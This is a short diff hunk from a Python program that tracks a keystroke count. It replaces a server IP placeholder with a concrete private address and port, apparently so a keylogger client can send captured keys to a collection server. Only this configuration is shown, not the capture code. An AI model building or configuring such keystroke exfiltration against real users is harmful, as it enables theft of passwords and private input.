@@ -5,7 +5,7 @@ import ctypes
 keystroke_count = 0
 
 # Server address and port
-SERVER_ADDRESS = 'SERVER_IP'  # Replace with the server's IP address
+SERVER_ADDRESS = '100.65.1.89'  # Replace with the server's IP address
 SERVER_PORT = 9999  # Must match the server port
 
 # Initialize a list
